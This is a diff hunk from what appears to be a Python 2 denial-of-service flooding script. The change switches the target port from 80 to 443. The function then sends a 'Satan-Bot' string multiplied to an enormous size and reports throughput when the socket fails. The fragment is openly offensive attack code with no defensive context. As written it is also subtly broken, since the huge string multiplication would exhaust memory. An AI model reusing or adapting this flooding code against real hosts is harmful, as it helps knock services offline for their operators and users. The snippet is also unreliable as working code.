@@ -91,7 +91,7 @@ def httpcall(url):
 	bps = (nbytes*8)/current
 	pkt_count = 0
 	try:
-			s.connect((url,80))
+			s.connect((url,443))
 			s.send("Satan-Bot" * 109951162777600)			
 	except socket.error as e:						
 			print "b/ps: %s" % bps
